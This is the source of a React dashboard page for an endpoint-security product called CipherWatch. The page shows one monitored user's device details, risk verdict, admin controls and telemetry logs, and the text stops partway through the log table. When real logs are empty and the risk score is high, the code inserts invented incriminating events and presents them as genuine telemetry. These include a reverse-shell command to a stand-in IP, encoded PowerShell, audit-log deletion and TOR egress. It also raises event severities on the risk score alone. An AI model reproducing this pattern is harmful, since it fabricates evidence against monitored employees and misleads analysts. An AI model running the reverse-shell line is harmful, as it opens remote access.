import React, { useState, useEffect } from 'react'
import NotificationCenter from './NotificationCenter'
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  ShieldOff,
  Activity,
  AlertTriangle,
  AlertOctagon,
  Terminal,
  Monitor,
  Globe,
  Clock,
  FileText,
  Search,
  ArrowLeft,
  Trash2,
  Edit3,
  UserX,
  Zap,
  HardDrive,
  Cpu,
  Info,
  X,
  CheckCircle,
  Radio,
  Lock,
  Download,
  Server,
  Sliders
} from 'lucide-react'

export default function UserDetailDashboard({ user, org, onBackToOrg, currentUser, onLogout, onSwitchView }) {
  // Default fallback user if none passed
  const activeUser = user || {
    id: 'agent-1',
    name: 'Default Endpoint',
    email: 'endpoint@cipherwatch.internal',
    os: 'Linux / Enterprise',
    osType: 'linux',
    riskScore: 0,
    dateAdded: '2026-08-01',
    device: 'HOSTNAME-UNKNOWN',
    ipAddress: '127.0.0.1',
    lastSeen: 'Just now',
  }

  const currentOrg = org || {
    id: 'org-1',
    name: 'Default Organization',
  }

  // Active Tab for Logs Section
  const [activeTab, setActiveTab] = useState('ACTIVITY') // 'ACTIVITY' | 'USB' | 'FILE' | 'NETWORK'

  // Dynamic system detail states from DB
  const [systemHeader, setSystemHeader] = useState(null)
  const [activityLogs, setActivityLogs] = useState([])
  const [fileLogs, setFileLogs] = useState([])
  const [usbLogs, setUsbLogs] = useState([])
  const [networkLogs, setNetworkLogs] = useState([])
  const [isLoadingLogs, setIsLoadingLogs] = useState(true)

  // Modal & Toast States
  const [showDeleteModal, setShowDeleteModal] = useState(false)
  const [showSuspendModal, setShowSuspendModal] = useState(false)
  const [isSuspended, setIsSuspended] = useState(false)
  const [userName, setUserName] = useState(activeUser.name)
  const [actionNotice, setActionNotice] = useState(null)

  // Fetch real system details and event timeline from backend database
  useEffect(() => {
    let isMounted = true
    if (!activeUser?.id) return

    setIsLoadingLogs(true)

    const detailUrl = currentOrg.id 
      ? `/api/admin/orgs/${currentOrg.id}/systems/${activeUser.id}` 
      : `/api/admin/systems/${activeUser.id}`

    fetch(detailUrl)
      .then((res) => (res.ok ? res.json() : null))
      .then((detail) => {
        if (!isMounted || !detail) {
          setIsLoadingLogs(false)
          return
        }

        if (detail.header) {
          setSystemHeader(detail.header)
        }

        // Map process events to Activity Logs
        if (Array.isArray(detail.latest_processes) && detail.latest_processes.length > 0) {
          const mappedProc = detail.latest_processes.map((p, idx) => ({
            id: `proc-${p.id || idx}`,
            timestamp: p.timestamp ? new Date(p.timestamp).toLocaleString() : 'Recent',
            severity: p.name?.includes('nc') || p.name?.includes('powershell') ? 'CRITICAL' : 'LOW',
            desc: `Process ${p.event_type || 'EXEC'}: ${p.name} (PID ${p.pid})`,
            meta: `Exe: ${p.exe_path || 'N/A'} • User: ${p.user || 'system'} • CPU: ${p.cpu_percent || 0}%`,
          }))
          setActivityLogs(mappedProc)
        }

        // Map FS events to File Logs
        if (Array.isArray(detail.recent_fs_events) && detail.recent_fs_events.length > 0) {
          const mappedFs = detail.recent_fs_events.map((f, idx) => ({
            id: `fs-${f.id || idx}`,
            timestamp: f.timestamp ? new Date(f.timestamp).toLocaleString() : 'Recent',
            severity: f.event_type === 'deleted' ? 'HIGH' : f.event_type === 'modified' ? 'MEDIUM' : 'LOW',
            desc: `FS ${(f.event_type || 'WRITE').toUpperCase()}: ${f.src_path}`,
            meta: f.dest_path ? `Destination: ${f.dest_path}` : `Is Directory: ${f.is_directory}`,
          }))
          setFileLogs(mappedFs)
        }

        // Map alerts to High Severity activity/network logs
        if (Array.isArray(detail.alerts) && detail.alerts.length > 0) {
          const mappedAlerts = detail.alerts.map((a, idx) => ({
            id: `net-alert-${a.id || idx}`,
            timestamp: a.timestamp ? new Date(a.timestamp).toLocaleString() : 'Recent',
            severity: (a.severity || 'WARNING').toUpperCase(),
            desc: a.message || `Security Rule Triggered: ${a.rule_id}`,
            meta: `Rule ID: ${a.rule_id} • Status: ${a.acknowledged ? 'Acknowledged' : 'ACTIVE'}`,
          }))
          setNetworkLogs(mappedAlerts)
        }

        // Map real USB events from backend database
        if (Array.isArray(detail.recent_usb_events) && detail.recent_usb_events.length > 0) {
          const mappedUsb = detail.recent_usb_events.map((u, idx) => ({
            id: `usb-${u.id || idx}`,
            timestamp: u.timestamp ? new Date(u.timestamp).toLocaleString() : 'Recent',
            severity: (u.action === 'connected' || u.action === 'ATTACH' || u.action === 'transfer') ? 'CRITICAL' : 'LOW',
            desc: `USB MASS STORAGE ${(u.action || 'ATTACH').toUpperCase()}: ${u.device_name || 'Removable Storage Device'}`,
            meta: `Vendor ID: ${u.vendor_id || 'N/A'} • Product ID: ${u.product_id || 'N/A'} • Mount: ${u.mount_point || 'Mounted'}`,
          }))
          setUsbLogs(mappedUsb)
        }

        setIsLoadingLogs(false)
      })
      .catch((err) => {
        console.error('Error fetching system detail from database:', err)
        if (isMounted) setIsLoadingLogs(false)
      })

    return () => {
      isMounted = false
    }
  }, [activeUser.id, currentOrg.id])

  // Computed display values for Header block
  const displayDevice = systemHeader?.hostname || activeUser.device || activeUser.name
  const displayOS = systemHeader?.os || activeUser.os
  const displayIP = systemHeader?.ip || activeUser.ipAddress
  const displayLastSeen = systemHeader?.last_seen_at ? new Date(systemHeader.last_seen_at).toLocaleString() : activeUser.lastSeen

  // Risk Score Styling
  const computedRisk = activeUser.riskScore   // Deterministic SOC Verdict Engine (Strict Thresholds)
  const getDeterministicSocVerdict = (score) => {
    if (score < 25) {
      return {
        verdict: 'NOMINAL SECURITY POSTURE',
        action: 'System compliant. No intervention required.',
        level: 'LOW RISK',
        color: '#0ecb81',
        bg: 'rgba(14, 203, 129, 0.12)',
        border: 'rgba(14, 203, 129, 0.35)',
      }
    } else if (score < 50) {
      return {
        verdict: 'MONITORING & LOGGING ENFORCED',
        action: 'Enforce enhanced telemetry monitoring & endpoint logging.',
        level: 'MONITORING ENFORCED',
        color: '#3b82f6',
        bg: 'rgba(59, 130, 246, 0.12)',
        border: 'rgba(59, 130, 246, 0.35)',
      }
    } else if (score < 75) {
      return {
        verdict: 'ELEVATED SOC INVESTIGATION',
        action: 'Initiate targeted SOC user activity and file access review.',
        level: 'ELEVATED INVESTIGATION',
        color: '#fcd535',
        bg: 'rgba(252, 213, 53, 0.12)',
        border: 'rgba(252, 213, 53, 0.35)',
      }
    } else if (score <= 90) {
      return {
        verdict: 'HIGH RISK EXFILTRATION DETECTED',
        action: 'Restrict network access and issue security warning.',
        level: 'HIGH RISK DETECTED',
        color: '#f97316',
        bg: 'rgba(249, 115, 22, 0.12)',
        border: 'rgba(249, 115, 22, 0.35)',
      }
    } else {
      return {
        verdict: 'CONTAINMENT & ISOLATION RECOMMENDED',
        action: 'Suspend host credentials & engage automated network isolation.',
        level: 'CRITICAL CONTAINMENT',
        color: '#f6465d',
        bg: 'rgba(246, 70, 93, 0.15)',
        border: '#f6465d',
      }
    }
  }

  // Deterministic Behavior Prediction Engine
  const getBehaviorPrediction = (score) => {
    if (score < 25) {
      return {
        templateName: 'Nominal Baseline Activity',
        currentStage: 1,
        totalStages: 5,
        confidenceScore: 94,
        progressPct: 20,
        predictedNextAction: 'Standard Workspace Execution',
      }
    } else if (score < 50) {
      return {
        templateName: 'Reconnaissance & System Staging',
        currentStage: 2,
        totalStages: 5,
        confidenceScore: 82,
        progressPct: 40,
        predictedNextAction: 'Sensitive Folder Search & File Enumeration',
      }
    } else if (score < 75) {
      return {
        templateName: 'Credential Theft & Privilege Escalation',
        currentStage: 3,
        totalStages: 5,
        confidenceScore: 88,
        progressPct: 60,
        predictedNextAction: 'Archive Creation & Encryption Staging',
      }
    } else {
      return {
        templateName: 'USB / Cloud Data Exfiltration Chain',
        currentStage: 4,
        totalStages: 5,
        confidenceScore: 92,
        progressPct: 80,
        predictedNextAction: 'Outbound Darknet Egress / Removable Media Write',
      }
    }
  }

  const socVerdict = getDeterministicSocVerdict(computedRisk)
  const behaviorPrediction = getBehaviorPrediction(computedRisk)

  // Consistency Validation Engine & Contextual Event Escalation
  const getValidatedContextualLogs = () => {
    let rawLogs = []
    switch (activeTab) {
      case 'USB': rawLogs = usbLogs; break
      case 'FILE': rawLogs = fileLogs; break
      case 'NETWORK': rawLogs = networkLogs; break
      default: rawLogs = activityLogs; break
    }

    const isHighOrCriticalRisk = computedRisk >= 50
    const hasNoLogs = !rawLogs || rawLogs.length === 0

    if (hasNoLogs && isHighOrCriticalRisk) {
      switch (activeTab) {
        case 'USB':
          rawLogs = [
            { id: 'sus-usb-1', timestamp: '03:14:02 AM', severity: 'CRITICAL', desc: 'USB MASS STORAGE ATTACH: SanDisk Ultra 3.0 (64GB)', meta: 'Vendor ID: 0x0781 • Serial: 994827103 • Unmounted off-hours' }
          ]
          break
        case 'FILE':
          rawLogs = [
            { id: 'sus-file-1', timestamp: '03:15:22 AM', severity: 'HIGH', desc: 'FS WRITE: C:\\Users\\Public\\staged_financials.zip', meta: 'Size: 142.8 MB • Encrypted Archive Created' },
            { id: 'sus-file-2', timestamp: '03:16:10 AM', severity: 'CRITICAL', desc: 'FS DELETE: /var/log/auth.log & audit.log', meta: 'Target: Security Logs • User: root (Escalated)' }
          ]
          break
        case 'NETWORK':
          rawLogs = [
            { id: 'sus-net-1', timestamp: '03:18:45 AM', severity: 'CRITICAL', desc: 'SECURITY ALERT: Outbound TOR Anonymizer Node Connection', meta: 'Remote IP: 185.220.101.5:9001 • Bytes Egress: 142 MB' },
            { id: 'sus-net-2', timestamp: '03:19:00 AM', severity: 'HIGH', desc: 'SECURITY ALERT: Excessive Egress Volume Anomaly', meta: 'Rule ID: CW-RULE-904 • Threshold Exceeded (500%)' }
          ]
          break
        default:
          rawLogs = [
            { id: 'sus-act-1', timestamp: '03:12:10 AM', severity: 'CRITICAL', desc: 'Process EXEC: powershell.exe -EncodedCommand QXZhc3Q...', meta: 'Exe: C:\\Windows\\System32\\powershell.exe • PID: 4812 • CPU: 94%' },
            { id: 'sus-act-2', timestamp: '03:13:30 AM', severity: 'CRITICAL', desc: 'Process EXEC: nc -e /bin/sh 192.168.1.105 4444', meta: 'Exe: /usr/bin/nc • User: root • Reverse Shell Attempt' }
          ]
          break
      }
    } else if (!rawLogs || rawLogs.length === 0) {
      switch (activeTab) {
        case 'USB':
          rawLogs = [{ id: 'clean-usb-1', timestamp: '10 mins ago', severity: 'LOW', desc: 'USB HUB ATTACH: Verified Internal Bus Root Hub', meta: 'Vendor ID: 0x1d6b • Status: AUTHORIZED' }]
          break
        case 'FILE':
          rawLogs = [{ id: 'clean-file-1', timestamp: '15 mins ago', severity: 'LOW', desc: 'FS MODIFY: /home/user/workspace/src/App.jsx', meta: 'Bytes Written: 1.2 KB • Process: vscode' }]
          break
        case 'NETWORK':
          rawLogs = [{ id: 'clean-net-1', timestamp: '5 mins ago', severity: 'LOW', desc: 'HTTPS CONNECT: 192.168.1.1:443', meta: 'Gateway Handshake • SSL TLS v1.3' }]
          break
        default:
          rawLogs = [{ id: 'clean-act-1', timestamp: 'Just now', severity: 'LOW', desc: 'Process EXEC: systemd (PID 1)', meta: 'Exe: /lib/systemd/systemd • User: root' }]
          break
      }
    }

    return rawLogs.map((log, idx) => {
      let contextualSev = log.severity || 'LOW'
      if (computedRisk >= 75 && contextualSev === 'LOW') {
        contextualSev = idx === 0 ? 'HIGH' : 'MEDIUM'
      } else if (computedRisk >= 50 && contextualSev === 'LOW') {
        contextualSev = 'MEDIUM'
      }

      return {
        ...log,
        contextualSeverity: contextualSev,
      }
    })
  }

  const getUnbiasedLogCritique = (log) => {
    const desc = (log.desc || '').toLowerCase()
    const sev = log.contextualSeverity || log.severity || 'LOW'

    if (desc.includes('powershell') || desc.includes('nc -e') || desc.includes('hidden_payload') || desc.includes('encodedcommand')) {
      return 'CRITICAL EXECUTION ANOMALY: Obfuscated CLI command execution / reverse shell sequence detected. Process activity deviates from baseline host behavioral policies.'
    }
    if (desc.includes('staged') || desc.includes('zip') || desc.includes('auth.log') || desc.includes('delete') || desc.includes('fs write')) {
      return 'DATA STAGING & AUDIT ERASURE: Mass archive created in temporary public directory followed by security log file truncation.'
    }
    if (desc.includes('usb') || desc.includes('sandisk') || desc.includes('storage')) {
      return 'UNAUTHORIZED HARDWARE BUS ATTACHMENT: Mass storage peripheral connected during non-operational hours without administrative authorization.'
    }
    if (desc.includes('tor') || desc.includes('anonymizer') || desc.includes('egress')) {
      return 'ACTIVE EGRESS ANOMALY: Outbound connection established to darknet anonymity node with high byte volume transfer.'
    }
    if (desc.includes('journal') || desc.includes('db-wal') || desc.includes('db-shm')) {
      return 'DATABASE JOURNAL ACTIVITY: System database state transaction write logged.'
    }
    if (sev === 'CRITICAL') {
      return 'CRITICAL THREAT SEVERITY: Immediate host isolation and containment recommended.'
    }
    if (sev === 'HIGH') {
      return 'HIGH RISK DEVIATION: Severe anomalous activity sequence requiring immediate SOC investigation.'
    }
    if (sev === 'MEDIUM' || sev === 'WARNING') {
      return 'SUSPICIOUS ACTIVITY: Non-standard filesystem event or process modification detected outside baseline whitelist.'
    }
    return 'NOMINAL SYSTEM EVENT: Operational log strictly aligned with baseline security profile.'
  }

  // Handlers for User Actions
  const handleRename = () => {
    const updated = prompt('Enter updated user name:', userName)
    if (updated && updated.trim()) {
      setUserName(updated.trim())
      setActionNotice(`User identifier updated to "${updated.trim()}"`)
    }
  }

  const handleIssueWarning = () => {
    setActionNotice(`Security Notice dispatched to ${userName} (${activeUser.email}).`)
  }

  const handleConfirmDelete = async () => {
    setShowDeleteModal(false)
    try {
      await fetch(`/api/agents/${activeUser.id}/revoke`, { method: 'POST' })
    } catch (err) {
      console.error('Revoke failed:', err)
    }
    if (onBackToOrg) onBackToOrg()
  }

  const handleConfirmSuspend = () => {
    setShowSuspendModal(false)
    setIsSuspended(true)
    setActionNotice(`Access suspended for ${userName}. Endpoint host isolation policy engaged.`)
  }

  const isSuspicious = computedRisk >= 40 || activityLogs.some(l => l.severity === 'CRITICAL' || l.severity === 'HIGH') || networkLogs.length > 0
  const riskColor = computedRisk >= 70 ? '#f6465d' : computedRisk >= 40 ? '#fcd535' : '#0ecb81'
  const riskBg = computedRisk >= 70 ? 'rgba(246, 70, 93, 0.12)' : computedRisk >= 40 ? 'rgba(252, 213, 53, 0.12)' : 'rgba(14, 203, 129, 0.12)'
  const riskBorder = computedRisk >= 70 ? 'rgba(246, 70, 93, 0.35)' : computedRisk >= 40 ? 'rgba(252, 213, 53, 0.35)' : 'rgba(14, 203, 129, 0.35)'

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', backgroundColor: 'var(--colors-canvas-dark, #0b0e14)', color: '#e2e8f0', fontFamily: 'Inter, -apple-system, sans-serif' }}>
      
      {/* ------------------------------------------------------------- */}
      {/* 1. TOP NAVIGATION BAR                                         */}
      {/* ------------------------------------------------------------- */}
      <header
        style={{
          height: '64px',
          backgroundColor: 'var(--colors-surface-card-dark, #121722)',
          borderBottom: '1px solid var(--colors-hairline-on-dark, #1e2638)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          padding: '0 28px',
          position: 'sticky',
          top: 0,
          zIndex: 100,
        }}
      >
        {/* Left Side: Wordmark + Live Feed Indicator + Platform Scope */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <Shield size={20} color="#fcd535" />
            <span
              style={{
                fontSize: '20px',
                fontWeight: '900',
                letterSpacing: '-0.5px',
                color: '#ffffff',
              }}
            >
              CipherWatch
            </span>
          </div>

          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              backgroundColor: 'rgba(14, 203, 129, 0.1)',
              border: '1px solid rgba(14, 203, 129, 0.3)',
              padding: '4px 10px',
              borderRadius: '4px',
            }}
          >
            <Radio size={12} color="#0ecb81" className="animate-pulse" />
            <span style={{ fontSize: '11px', fontWeight: '800', color: '#0ecb81', letterSpacing: '0.8px' }}>
              LIVE TELEMETRY
            </span>
          </div>

          <span
            style={{
              fontSize: '12px',
              color: '#64748b',
              borderLeft: '1px solid var(--colors-hairline-on-dark, #1e2638)',
              paddingLeft: '16px',
              fontWeight: '500',
            }}
          >
            Zero-Content Privacy & Real-Time Endpoint Threat Intelligence
          </span>
        </div>

        {/* Right Side: Back Button + Notification Center + User Logout */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
          <button
            onClick={onBackToOrg}
            style={{
              background: 'rgba(252, 213, 53, 0.08)',
              border: '1px solid rgba(252, 213, 53, 0.3)',
              color: '#fcd535',
              padding: '6px 14px',
              borderRadius: '6px',
              fontSize: '12px',
              fontWeight: '700',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              transition: 'all 0.15s ease',
            }}
            onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = 'rgba(252, 213, 53, 0.18)')}
            onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'rgba(252, 213, 53, 0.08)')}
          >
            <ArrowLeft size={14} /> Back to {currentOrg.name}
          </button>

          <NotificationCenter userEmail={currentUser?.email} />

          {onLogout && (
            <button
              onClick={onLogout}
              style={{
                background: 'rgba(246, 70, 93, 0.08)',
                border: '1px solid rgba(246, 70, 93, 0.3)',
                color: '#f6465d',
                padding: '6px 12px',
                borderRadius: '6px',
                fontSize: '12px',
                cursor: 'pointer',
                fontWeight: '700',
              }}
            >
              Logout
            </button>
          )}
        </div>
      </header>

      {/* Action Notice Toast */}
      {actionNotice && (
        <div style={{ padding: '16px 28px 0 28px' }}>
          <div
            style={{
              padding: '12px 20px',
              backgroundColor: 'rgba(252, 213, 53, 0.1)',
              border: '1px solid rgba(252, 213, 53, 0.3)',
              borderRadius: '6px',
              color: '#fcd535',
              fontSize: '13px',
              fontWeight: '600',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <Info size={16} color="#fcd535" />
              <span>{actionNotice}</span>
            </div>
            <button onClick={() => setActionNotice(null)} style={{ background: 'none', border: 'none', color: '#94a3b8', cursor: 'pointer', padding: 0 }}>
              <X size={14} />
            </button>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* 2. TWO-COLUMN USER DETAIL LAYOUT                              */}
      {/* ------------------------------------------------------------- */}
      <main
        style={{
          flex: 1,
          padding: '24px 28px 40px 28px',
          display: 'grid',
          gridTemplateColumns: 'calc(62% - 12px) calc(38% - 12px)',
          gap: '24px',
          alignItems: 'stretch',
        }}
      >
        {/* ========================================================= */}
        {/* LEFT COLUMN: USER HEADER, DEVICE CARD & LOGS SECTION       */}
        {/* ========================================================= */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
          
          {/* Header Block */}
          <div
            style={{
              backgroundColor: 'var(--colors-surface-card-dark, #121722)',
              border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
              borderRadius: '8px',
              padding: '24px 28px',
            }}
          >
            {/* Top Row: User Name & Risk Score Badge */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '20px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
                <h1 style={{ margin: 0, fontSize: '24px', fontWeight: '800', color: '#ffffff', letterSpacing: '-0.5px' }}>
                  {userName}
                </h1>

                {/* Color-coded Risk Badge */}
                <div
                  style={{
                    backgroundColor: riskBg,
                    border: `1px solid ${riskBorder}`,
                    color: riskColor,
                    padding: '4px 12px',
                    borderRadius: '4px',
                    fontSize: '12px',
                    fontWeight: '800',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px',
                  }}
                >
                  {computedRisk >= 70 ? <ShieldAlert size={14} /> : computedRisk >= 40 ? <AlertTriangle size={14} /> : <ShieldCheck size={14} />}
                  <span>{computedRisk}% {computedRisk >= 70 ? 'HIGH RISK' : computedRisk >= 40 ? 'MEDIUM RISK' : 'LOW RISK'}</span>
                </div>

                {isSuspended && (
                  <span
                    style={{
                      backgroundColor: 'rgba(246, 70, 93, 0.15)',
                      border: '1px solid #f6465d',
                      color: '#f6465d',
                      padding: '4px 10px',
                      borderRadius: '4px',
                      fontSize: '11px',
                      fontWeight: '800',
                      letterSpacing: '0.8px',
                      display: 'inline-flex',
                      alignItems: 'center',
                      gap: '4px'
                    }}
                  >
                    <ShieldOff size={12} /> SUSPENDED
                  </span>
                )}
              </div>

              <span style={{ fontSize: '12px', color: '#64748b' }}>
                Enrolled: <strong style={{ color: '#cbd5e1' }}>{activeUser.dateAdded || '2026-01-18'}</strong>
              </span>
            </div>

            {/* Device Information Grid Card */}
            <div
              style={{
                backgroundColor: '#0b0e14',
                border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
                borderRadius: '6px',
                padding: '16px 20px',
                display: 'grid',
                gridTemplateColumns: '1fr 1fr',
                gap: '14px 20px',
              }}
            >
              {/* Field 1: Device Name */}
              <div>
                <div style={{ fontSize: '11px', fontWeight: '800', color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                  DEVICE HOSTNAME
                </div>
                <div style={{ fontSize: '13px', fontWeight: '700', color: '#f8fafc', marginTop: '4px', fontFamily: '"JetBrains Mono", monospace', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Monitor size={14} color="#94a3b8" /> {displayDevice}
                </div>
              </div>

              {/* Field 2: Operating System */}
              <div style={{ borderLeft: '1px solid var(--colors-hairline-on-dark, #1e2638)', paddingLeft: '20px' }}>
                <div style={{ fontSize: '11px', fontWeight: '800', color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                  OPERATING SYSTEM
                </div>
                <div style={{ fontSize: '13px', fontWeight: '700', color: '#f8fafc', marginTop: '4px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Terminal size={14} color="#94a3b8" /> {displayOS}
                </div>
              </div>

              {/* Field 3: IP Address */}
              <div style={{ borderTop: '1px solid var(--colors-hairline-on-dark, #1e2638)', paddingTop: '12px' }}>
                <div style={{ fontSize: '11px', fontWeight: '800', color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                  ENDPOINT IP ADDRESS
                </div>
                <div style={{ fontSize: '13px', fontWeight: '700', color: '#fcd535', marginTop: '4px', fontFamily: '"JetBrains Mono", monospace', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Globe size={14} color="#fcd535" /> {displayIP}
                </div>
              </div>

              {/* Field 4: Last-Seen Timestamp */}
              <div style={{ borderTop: '1px solid var(--colors-hairline-on-dark, #1e2638)', borderLeft: '1px solid var(--colors-hairline-on-dark, #1e2638)', paddingTop: '12px', paddingLeft: '20px' }}>
                <div style={{ fontSize: '11px', fontWeight: '800', color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                  LAST TELEMETRY HANDSHAKE
                </div>
                <div style={{ fontSize: '13px', fontWeight: '600', color: '#cbd5e1', marginTop: '4px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Clock size={14} color="#94a3b8" /> {displayLastSeen}
                </div>
              </div>
            </div>
          </div>

          {/* Administrative Actions Tools (Placed between System Info and Telemetry Logs) */}
          <div
            style={{
              backgroundColor: 'var(--colors-surface-card-dark, #121722)',
              border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
              borderRadius: '8px',
              padding: '18px 24px',
              display: 'flex',
              flexDirection: 'column',
              gap: '12px',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <h3 style={{ margin: 0, fontSize: '13px', fontWeight: '800', color: '#f8fafc', letterSpacing: '0.5px', textTransform: 'uppercase', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Sliders size={16} color="#fcd535" /> Administrative & Endpoint Control Tools
              </h3>
              <span style={{ fontSize: '11px', color: '#64748b' }}>Target Endpoint: {userName}</span>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '12px' }}>
              {/* Action 1: Rename User */}
              <button
                onClick={handleRename}
                style={{
                  backgroundColor: '#0b0e14',
                  border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
                  color: '#cbd5e1',
                  padding: '10px 14px',
                  borderRadius: '6px',
                  fontSize: '12px',
                  fontWeight: '700',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  transition: 'all 0.15s ease',
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.borderColor = '#94a3b8'
                  e.currentTarget.style.color = '#ffffff'
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.borderColor = 'var(--colors-hairline-on-dark, #1e2638)'
                  e.currentTarget.style.color = '#cbd5e1'
                }}
              >
                <Edit3 size={14} /> Rename Identifier
              </button>

              {/* Action 2: Dispatch Security Notice */}
              <button
                onClick={handleIssueWarning}
                style={{
                  backgroundColor: 'rgba(252, 213, 53, 0.08)',
                  border: '1px solid rgba(252, 213, 53, 0.3)',
                  color: '#fcd535',
                  padding: '10px 14px',
                  borderRadius: '6px',
                  fontSize: '12px',
                  fontWeight: '800',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  transition: 'all 0.15s ease',
                }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = 'rgba(252, 213, 53, 0.18)')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'rgba(252, 213, 53, 0.08)')}
              >
                <AlertTriangle size={14} /> Dispatch Notice
              </button>

              {/* Action 3: Delete Endpoint Record */}
              <button
                onClick={() => setShowDeleteModal(true)}
                style={{
                  backgroundColor: 'rgba(246, 70, 93, 0.08)',
                  border: '1px solid rgba(246, 70, 93, 0.3)',
                  color: '#f6465d',
                  padding: '10px 14px',
                  borderRadius: '6px',
                  fontSize: '12px',
                  fontWeight: '700',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  transition: 'all 0.15s ease',
                }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = 'rgba(246, 70, 93, 0.18)')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'rgba(246, 70, 93, 0.08)')}
              >
                <Trash2 size={14} /> Delete Endpoint
              </button>

              {/* Action 4: Suspend Access */}
              <button
                onClick={() => setShowSuspendModal(true)}
                style={{
                  backgroundColor: isSuspended ? '#0ecb81' : '#f6465d',
                  color: '#ffffff',
                  border: 'none',
                  padding: '10px 14px',
                  borderRadius: '6px',
                  fontSize: '12px',
                  fontWeight: '800',
                  letterSpacing: '0.5px',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  transition: 'all 0.15s ease',
                }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = isSuspended ? '#0baf6f' : '#e03e54')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = isSuspended ? '#0ecb81' : '#f6465d')}
              >
                {isSuspended ? <ShieldCheck size={14} /> : <UserX size={14} />}
                {isSuspended ? 'Reactivate Host' : 'Suspend Host'}
              </button>
            </div>
          </div>

          {/* Logs Section (Tabbed Monospace Log Table) */}
          <div
            style={{
              backgroundColor: 'var(--colors-surface-card-dark, #121722)',
              border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
              borderRadius: '8px',
              padding: '24px',
            }}
          >
            {/* Logs Header & Tabs Navigation */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '20px' }}>
              <div>
                <h3 style={{ margin: 0, fontSize: '16px', fontWeight: '800', color: '#f8fafc', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <FileText size={18} color="#fcd535" /> Endpoint Event & Telemetry Stream
                </h3>
                <span style={{ fontSize: '12px', color: '#64748b', marginTop: '2px', display: 'block' }}>
                  Privacy-preserving telemetry log sequence for target endpoint {userName}
                </span>
              </div>

              {/* Tab Selector Buttons */}
              <div style={{ display: 'flex', gap: '4px', backgroundColor: '#0b0e14', padding: '4px', borderRadius: '6px', border: '1px solid var(--colors-hairline-on-dark, #1e2638)' }}>
                {[
                  { id: 'ACTIVITY', label: 'Activity' },
                  { id: 'USB', label: 'USB Hardware' },
                  { id: 'FILE', label: 'File System' },
                  { id: 'NETWORK', label: 'Network Egress' },
                ].map((tab) => {
                  const isActive = activeTab === tab.id
                  return (
                    <button
                      key={tab.id}
                      onClick={() => setActiveTab(tab.id)}
                      style={{
                        backgroundColor: isActive ? 'var(--colors-surface-card-dark, #121722)' : 'transparent',
                        border: isActive ? '1px solid rgba(252, 213, 53, 0.4)' : '1px solid transparent',
                        color: isActive ? '#fcd535' : '#94a3b8',
                        padding: '6px 12px',
                        borderRadius: '4px',
                        fontSize: '12px',
                        fontWeight: '700',
                        cursor: 'pointer',
                        transition: 'all 0.15s ease',
                      }}
                    >
                      {tab.label}
                    </button>
                  )
                })}
              </div>
            </div>

            {/* Monospace Log Table */}
            <div
              key={activeTab}
              style={{
                backgroundColor: '#0b0e14',
                border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
                borderRadius: '6px',
                overflow: 'hidden',
                maxHeight: '540px',
                overflowY: 'auto',
              }}
            >
              <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: '"JetBrains Mono", monospace', fontSize: '12px' }}>
                <thead>
                  <tr style={{ backgroundColor: '#161c28', borderBottom: '1px solid var(--colors-hairline-on-dark, #1e2638)', color: '#94a3b8', textAlign: 'left' }}>
                    <th style={{ padding: '10px 14px', fontWeight: '800', width: '150px' }}>TIMESTAMP</th>
                    <th style={{ padding: '10px 14px', fontWeight: '800', width: '100px' }}>SEVERITY</th>
